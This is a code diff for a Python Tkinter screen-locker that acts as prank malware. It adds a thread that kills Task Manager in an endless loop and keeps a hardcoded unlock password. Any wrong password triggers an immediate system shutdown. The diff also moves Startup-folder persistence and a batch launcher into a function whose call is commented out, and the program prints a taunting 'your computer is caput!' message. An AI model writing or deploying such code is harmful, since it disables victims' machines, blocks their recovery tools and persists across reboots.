@@ -7,6 +7,7 @@ import tkinter.font as tkFont
 from os import system
 from getpass import getuser
 from shutil import move
+import threading
 
 #v
 class M():
@@ -22,34 +23,43 @@ class M():
 
     def run_password():
         if inp_pass.get() == "123321":
+            system("start explorer")
             exit()
         else:
             system("shutdown /s /t 0")
 
+    def run_atr():
+        try:
+            system("start system/atr.bat") 
+            M.run_kill()
+        except:
+            pass
+
+        try:
+            USER_NAME = getuser()
+            src = '../vit'
+            dest = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
+
+        except:
+            pass
+
+        try:
+            system("start system/atr.bat")
+            move(src, dest)
+        except:
+            pass
+
+    def run_task_kill():
+            while True:
+                system("Taskkill /f /im taskmgr.exe")
+
+
 def init():
+    thread_taskKiller = threading.Thread(target=M.run_task_kill)
+    thread_taskKiller.start()
     M.run_music()
-    try:
-        system("start system/atr.bat")
-    except:
-        pass
-    
-    M.run_kill()
-
-    try:
-        USER_NAME = getuser()
-        src = '../vit'
-        dest = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
-
-    except:
-        pass
-
-    try:
-        system("start system/atr.bat")
-        move(src, dest)
-    except:
-        pass
-
-    M.run_cmd(15, "echo your computer is caput!")
+    #M.run_atr()
+    M.run_cmd(3, "echo your computer is caput!")
 init()
 
 def Quit():
